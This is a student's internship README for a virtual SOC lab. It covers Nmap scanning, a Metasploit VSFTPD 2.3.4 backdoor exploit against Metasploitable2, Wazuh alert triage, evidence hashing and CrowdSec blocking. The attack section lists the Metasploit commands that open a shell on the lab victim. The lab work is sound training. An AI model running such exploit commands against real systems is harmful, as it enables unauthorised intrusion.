# cyart-soc-team (week 2)

# Full Alert-to-Response Cybersecurity Lab

## Overview
This project demonstrates a complete cybersecurity alert-to-response workflow using offensive and defensive security tools inside a virtual lab environment. The project covers vulnerability assessment, exploitation, security monitoring, alert triage, evidence preservation, incident response, and reporting procedures.

The lab environment was built using Kali Linux, Metasploitable2, Wazuh, CrowdSec, Velociraptor, FTK Imager, and VirtualBox.

This project was completed as part of my cybersecurity internship at CYART.

---

# Objectives

- Simulate real-world cyberattacks using Metasploit
- Perform vulnerability assessment using Nmap
- Monitor security events using Wazuh SIEM
- Investigate alerts and perform threat triage
- Preserve forensic evidence and verify integrity
- Implement incident response using CrowdSec
- Document incident handling procedures

---

# Tools Used

| Tool | Purpose |
|------|---------|
| Metasploit Framework | Exploitation and attack simulation |
| Wazuh SIEM | Security monitoring and alert analysis |
| CrowdSec | Threat response and IP blocking |
| Nmap | Vulnerability scanning |
| Velociraptor | Volatile evidence collection |
| FTK Imager | Memory acquisition |
| VirusTotal | Threat intelligence analysis |
| AlienVault OTX | IP reputation checking |
| VirtualBox | Virtual lab environment |

---

# Lab Environment

| Machine | Role | IP Address |
|---------|------|------------|
| Kali Linux | Attacker | 192.168.56.101 |
| Metasploitable2 | Victim | 192.168.56.102 |
| Wazuh Server | Monitoring | Internal VM |

---

# Project Activities

## 1. Vulnerability Assessment
- Performed Nmap scanning
- Identified vulnerable services
- Enumerated open ports and services

### Commands Used
```bash
nmap -sV 192.168.56.102
```

---

## 2. Attack Simulation
- Used Metasploit Framework
- Exploited VSFTPD backdoor vulnerability
- Established Meterpreter session

### Commands Used
```bash
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.56.102
run
```

---

## 3. Detection and Monitoring
- Monitored security events using Wazuh
- Reviewed alert severity levels
- Analyzed MITRE ATT&CK mappings

---

## 4. Alert Triage
- Investigated suspicious SSH activity
- Reviewed raw logs and authentication events
- Performed threat intelligence validation using:
  - AlienVault OTX
  - VirusTotal

---

## 5. Evidence Preservation
- Collected volatile network evidence
- Performed memory acquisition
- Verified evidence integrity using SHA256 hashing

### Commands Used
```bash
sha256sum memorydump.raw
sha256sum memorydump.raw > hash.txt
sha256sum -c hash.txt
```

---

## 6. Incident Response
- Added CrowdSec blocking decisions
- Simulated containment procedures
- Verified network communication

### Commands Used
```bash
sudo cscli decisions add --ip 192.168.56.101 --reason "VSFTPD Attack"
```

---

# Key Learning Outcomes

- Understanding SOC workflows
- Security monitoring and alert triage
- Vulnerability assessment techniques
- Threat detection and response
- Digital forensic evidence handling
- Incident documentation procedures
- Practical use of cybersecurity tools

---

# Internship Experience

During my internship at CYART, I gained practical exposure to cybersecurity operations including vulnerability assessment, alert monitoring, threat hunting, incident response, and forensic evidence handling. This project helped strengthen my understanding of SOC workflows and real-world cybersecurity investigation techniques.

---

# Screenshots

Project screenshots are included in the documentation files and demonstrate:
- Nmap scanning
- Metasploit exploitation
- Wazuh dashboard monitoring
- CrowdSec response actions
- Evidence preservation
- Threat hunting activities

---

# Disclaimer

This project was conducted in a controlled virtual lab environment for educational and research purposes only. No real systems, networks, or production environments were targeted.

---

# Author

Faizan Majeed

Cybersecurity Intern at CYART  
BCA Student | SOC & Incident Response Enthusiast
